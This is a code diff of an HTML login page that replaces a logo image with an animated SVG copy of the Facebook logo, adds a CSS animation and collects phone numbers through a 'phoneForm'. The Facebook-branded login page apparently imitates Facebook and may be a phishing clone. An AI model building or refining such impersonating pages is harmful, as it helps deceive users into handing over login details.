@@ -28,10 +28,33 @@
       text-align: center;
     }
 
-    .container img.logo {
+    .logo {
       width: 85px;
       height: 85px;
       margin-bottom: 15px;
+    }
+
+    .logo-animate {
+      animation: pulse-rotate 2.5s infinite ease-in-out;
+      transform-origin: center;
+    }
+
+    @keyframes pulse-rotate {
+      0% {
+        transform: scale(1) rotate(0deg);
+      }
+      25% {
+        transform: scale(1.05) rotate(2deg);
+      }
+      50% {
+        transform: scale(1.1) rotate(0deg);
+      }
+      75% {
+        transform: scale(1.05) rotate(-2deg);
+      }
+      100% {
+        transform: scale(1) rotate(0deg);
+      }
     }
 
     h2 {
@@ -74,7 +97,7 @@
 
     button {
       width: 40%;
-      padding:  12px;
+      padding: 12px;
       font-size: 17px;
       background-color: #1877f2;
       border: none;
@@ -119,7 +142,14 @@
 <body>
 
   <div class="container">
-    <img src="face.png" alt="الشعار" class="logo" />
+    <!-- شعار فيسبوك SVG متحرك -->
+    <svg viewBox="0 0 80 80" xmlns="http://www.w3.org/2000/svg" class="logo">
+      <g class="logo-animate">
+        <circle cx="40" cy="40" r="35" fill="#1877F2" />
+        <text x="40" y="52" text-anchor="middle" font-size="42" font-family="Arial, sans-serif" fill="white" font-weight="bold">f</text>
+      </g>
+    </svg>
+
     <h2>Login</h2>
 
     <form id="phoneForm" onsubmit="return sendPhone(event);">
